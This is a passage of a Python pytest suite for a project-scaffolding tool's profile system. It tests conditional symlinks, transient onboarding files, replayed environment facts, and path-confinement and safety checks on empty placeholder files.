    dated = target / "docs" / f"{date.today():%Y-%m-%d}-charter.md"
    assert dated.read_text(encoding="utf-8") == "v1\n"
    _commit(target)
    _bump_profile(prof.root, version="0.1.1", files={"docs/@DATE@-charter.md": "v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert dated.read_text(encoding="utf-8") == "v1\n"  # seed: shipped once, never refreshed


def test_conditional_link_ships_only_when_true(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"AGENTS.md": "contract\n"},
        prompts=[{"name": "use_claude", "type": "confirm", "message": "?", "default": False}],
    )
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"CLAUDE.md": {"target": "AGENTS.md", "when": "answers.use_claude"}}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")

    on, off = tmp_path / "on", tmp_path / "off"
    on.mkdir(), off.mkdir()
    owned_on = profiles.apply(prof, _config(on), Scaffolder(on), {"use_claude": True})
    owned_off = profiles.apply(prof, _config(off), Scaffolder(off), {"use_claude": False})
    assert (on / "CLAUDE.md").is_symlink() and "CLAUDE.md" in owned_on
    assert not (off / "CLAUDE.md").exists() and "CLAUDE.md" not in owned_off


def test_update_removes_a_link_whose_when_flipped_false(tmp_path: Path) -> None:
    # The conditional-link mirror of the renders-empty orphan case: a bump changes the link's
    # `when` to false -> the pristine symlink is orphan-removed and leaves the owned set.
    # The base must not create CLAUDE.md itself, or the profile link is skipped as pre-existing
    # (first-writer-wins) — so target a claude-free tool set.
    prof = _make_profile(
        tmp_path, "team", {"AGENTS.md": "contract\n"}, version="0.1.0", by_path=True
    )
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"CLAUDE.md": {"target": "AGENTS.md", "when": "true"}}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source=str(prof.root))

    target = tmp_path / "proj"
    target.mkdir()
    config = WizardConfig(
        project_name="demo",
        output_dir=target,
        languages=["python"],
        init_git=False,
        ai_tools=["cursor"],
    )
    cli.build(config, Scaffolder(target), prof)
    assert (target / "CLAUDE.md").is_symlink()
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "CLAUDE.md" in m["profile"]["files"]  # profile-owned, not the base's
    _commit(target)

    data["version"] = "0.1.1"
    data["links"] = {"CLAUDE.md": {"target": "AGENTS.md", "when": "false"}}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert not (target / "CLAUDE.md").exists() and not (target / "CLAUDE.md").is_symlink()
    m2 = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "CLAUDE.md" not in m2["profile"]["files"]  # excluded from the owned set


# --- transient outputs (RFC 2026-07-05 §6) -----------------------------------------------------


def test_transient_output_is_written_but_never_recorded(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {"ONBOARD.md": "run once\n", "docs/x.md": "keep\n"})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["transient"] = ["ONBOARD.md"]
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")

    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    assert (target / "ONBOARD.md").read_text(encoding="utf-8") == "run once\n"  # written
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert "ONBOARD.md" not in m["files"]  # never fingerprinted
    assert "ONBOARD.md" not in m["profile"]["files"]  # never owned
    assert "docs/x.md" in m["profile"]["files"]  # the managed sibling still is


def test_update_never_resurrects_a_deleted_transient(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"ONBOARD.md": "run once\n", "docs/x.md": "v1\n"},
        version="0.1.0",
        by_path=True,
    )
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["transient"] = ["ONBOARD.md"]
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source=str(prof.root))

    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    (target / "ONBOARD.md").unlink()  # onboarding done — the file self-deleted
    _commit(target)

    _bump_profile(prof.root, version="0.1.1", files={"docs/x.md": "v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert not (target / "ONBOARD.md").exists()  # not resurrected
    assert (target / "docs/x.md").read_text(encoding="utf-8") == "v2\n"  # siblings refresh


def test_validate_rejects_a_transient_entry_without_a_template(tmp_path: Path) -> None:
    import argparse

    prof = _make_profile(tmp_path, "team", {"docs/x.md": "x\n"})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["transient"] = ["missing.md"]
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    c = _Console()
    assert profiles._validate(argparse.Namespace(path=str(prof.root)), c) == 1
    assert "transient entry 'missing.md'" in c.text


def test_sensed_env_facts_flow_to_profiles_and_replay(tmp_path: Path) -> None:
    # RFC 2026-07-05 §2: facts are observed once in cli.main, exposed as env.<name>, recorded
    # in the manifest snapshot, and replayed by update (never re-sensed).
    prof = _make_profile(
        tmp_path,
        "team",
        {
            "docs/facts.md.j2": (
                "git={{ env.is_git }} os={{ env.os }} readme={{ env.has_readme }} "
                "agents={{ env.has_agents_md }} ci={{ env.has_ci_config }}"
            )
        },
        by_path=True,
    )
    target = tmp_path / "proj"
    (target / ".github" / "workflows").mkdir(parents=True)
    (target / "README.md").write_text("hi\n", encoding="utf-8")
    (target / "AGENTS.md").write_text("rules\n", encoding="utf-8")
    rc = cli.main(["demo", "-o", str(target), "-y", "--no-git", "--profile", str(prof.root)])
    assert rc == 0
    facts = (target / "docs" / "facts.md").read_text(encoding="utf-8")
    assert "git=False" in facts  # --no-git and no .git dir
    assert "readme=True" in facts and "agents=True" in facts and "ci=True" in facts
    import platform

    assert f"os={platform.system().lower()}" in facts
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    snap = m["config"]
    assert snap["has_readme"] is True and snap["has_agents_md"] is True
    assert snap["has_ci_config"] is True and snap["is_git"] is False
    assert snap["os_name"] == platform.system().lower()

    # Replay: make the fact drift on disk (delete README), bump, update — the recorded
    # observation wins, so the managed file re-renders identically instead of flipping.
    (target / "README.md").unlink()
    _commit(target)
    # bump with an unrelated new file so the version changes but facts.md re-renders
    _bump_profile(prof.root, version="1.0.1", files={"docs/other.md": "y\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert "readme=True" in (target / "docs" / "facts.md").read_text(encoding="utf-8")


def test_is_git_senses_a_preexisting_repo_without_init(tmp_path: Path) -> None:
    # The sensing disjunct itself: --no-git into a target that already IS a git repo must
    # still observe is_git=True (kills the `and`/dropped-`.exists()` mutants).
    prof = _make_profile(tmp_path, "team", {"docs/g.md.j2": "git={{ env.is_git }}"}, by_path=True)
    target = tmp_path / "proj"
    (target / ".git").mkdir(parents=True)  # a pre-existing repo marker
    rc = cli.main(["demo", "-o", str(target), "-y", "--no-git", "--profile", str(prof.root)])
    assert rc == 0
    assert (target / "docs/g.md").read_text(encoding="utf-8") == "git=True"
    m = json.loads((target / MANIFEST_PATH).read_text(encoding="utf-8"))
    assert m["config"]["is_git"] is True


def test_empty_files_ship_conditionally_and_are_owned(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {},
        prompts=[{"name": "docs", "type": "confirm", "message": "?", "default": True}],
    )
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["empty_files"] = {"docs/rfc/.gitkeep": "answers.docs", "notes/.gitkeep": None}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")

    on, off = tmp_path / "on", tmp_path / "off"
    on.mkdir(), off.mkdir()
    # A non-empty USER file already at an empty_files path: never clobbered, never owned —
    # a regression here would make the manifest claim the user's file as profile-owned.
    (on / "notes").mkdir()
    (on / "notes" / ".gitkeep").write_text("the user's notes marker\n", encoding="utf-8")
    owned_on = profiles.apply(prof, _config(on), Scaffolder(on), {"docs": True})
    owned_off = profiles.apply(prof, _config(off), Scaffolder(off), {"docs": False})
    assert (on / "notes/.gitkeep").read_text(encoding="utf-8") == "the user's notes marker\n"
    assert "notes/.gitkeep" not in owned_on
    assert (on / "docs/rfc/.gitkeep").read_text(encoding="utf-8") == ""
    assert "docs/rfc/.gitkeep" in owned_on
    assert not (off / "docs/rfc/.gitkeep").exists()  # condition false -> skipped
    assert (off / "notes/.gitkeep").read_text(encoding="utf-8") == ""  # fresh here -> ships
    assert "notes/.gitkeep" in owned_off
    assert "docs/rfc/.gitkeep" not in owned_off


def test_empty_files_validation_and_confinement(tmp_path: Path) -> None:
    d = tmp_path / "p"
    (d / "templates").mkdir(parents=True)

    def manifest(entries: object) -> None:
        (d / "profile.json").write_text(
            json.dumps({"name": "p", "version": "1.0.0", "empty_files": entries}),
            encoding="utf-8",
        )

    for bad, match in [
        (["x"], "must be an object"),
        ({"": None}, "keys must be paths"),
        ({"a": 1}, "null or a string"),
        ({"a": "{% bad"}, "not a valid expression"),
        ({"../out": None}, "inside the project"),
        ({"/abs": None}, "inside the project"),
    ]:
        manifest(bad)
        with pytest.raises(profiles.ProfileError, match=match):
            profiles.load(d)
    manifest({"docs/.gitkeep": None})
    assert profiles.load(d).empty_files == (("docs/.gitkeep", None),)


def test_gitkeep_is_inert_but_other_empty_paths_fail_closed(tmp_path: Path) -> None:
    prof = _make_profile(tmp_path, "team", {})
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["empty_files"] = {"docs/rfc/.gitkeep": None}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    assert profiles.classify_safety(profiles.load(prof.root))[0] == "safe"
    data["empty_files"] = {"conftest.py": None}  # an empty sink path is still a sink path
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    tier, reasons = profiles.classify_safety(profiles.load(prof.root))
    assert tier == "unsafe" and any("conftest.py" in r for r in reasons)
